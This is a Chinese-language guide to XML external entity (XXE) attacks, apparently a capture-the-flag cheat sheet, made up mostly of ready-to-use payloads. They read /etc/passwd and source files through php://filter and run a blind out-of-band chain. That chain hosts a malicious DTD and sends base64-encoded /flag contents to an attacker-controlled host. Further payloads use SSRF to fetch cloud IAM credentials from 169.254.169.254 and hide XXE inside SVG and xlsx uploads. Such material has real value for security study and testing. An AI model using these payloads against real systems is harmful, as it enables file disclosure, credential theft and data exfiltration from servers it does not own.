# XML 外部实体注入 (XXE) 漏洞指南

XXE 漏洞发生在应用程序解析 XML 输入时，允许攻击者包含恶意的外部实体，从而导致读取本地文件、执行 SSRF（服务端请求伪造）、拒绝服务攻击等。

## 1. 发现与识别 XXE

- **触发点**: 
  - 抓包观察请求体是否为 XML 格式 (`Content-Type: application/xml` 或 `text/xml`)。
  - 如果请求体是 JSON，尝试将 `Content-Type` 改为 `application/xml` 并发送等效的 XML 数据，看服务器是否解析。
  - 常见场景：SOAP 请求、SAML、Excel/Word (OOXML) 文件解析、SVG 图片解析。

## 2. 读取本地文件 (有回显)

如果服务器将 XML 解析的结果直接返回在 HTTP 响应中，可以使用基础的外部实体读取文件。

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```
*注意：如果文件包含 `<` 或 `&` 等特殊字符，XML 解析会报错。此时需要使用 PHP 伪协议结合 Base64 编码，或使用 CDATA 节。*
- **Base64 读取**: `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">`

## 3. Blind XXE (无回显/盲注)

如果 XML 解析后不返回任何结果，必须使用带外数据通道 (OOB) 将数据外带。你需要使用 Python 启动一个临时的 HTTP 服务来接收请求。

**步骤 1**: 准备恶意的外部 DTD 文件（假设你将其托管在 `http://你的IP/evil.dtd`）：
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://你的IP/log?data=%file;'>">
%eval;
%exfiltrate;
```

**步骤 2**: 构造 Payload 发送给目标服务器：
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://你的IP/evil.dtd">
%sp;
]>
<r>&exfiltrate;</r>
```
*流程：目标服务器解析 XML -> 请求 `evil.dtd` -> 读取本地文件 `/flag` -> 将 Base64 编码的文件内容附加在 URL 后面发送给你的 HTTP 服务器。*

## 4. SSRF 通过 XXE

可以利用 XXE 发起服务端请求伪造，探测内网端口或访问云元数据。
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<root>&xxe;</root>
```

## 5. Excel/SVG 中的 XXE

- **SVG 图片**: 上传 SVG 格式的图片，内部包含 XXE Payload。
- **Excel (xlsx)**: `.xlsx` 本质上是 ZIP 压缩包。解压 `.xlsx`，在 `[Content_Types].xml` 或 `xl/workbook.xml` 中插入 XXE Payload，重新打包后上传。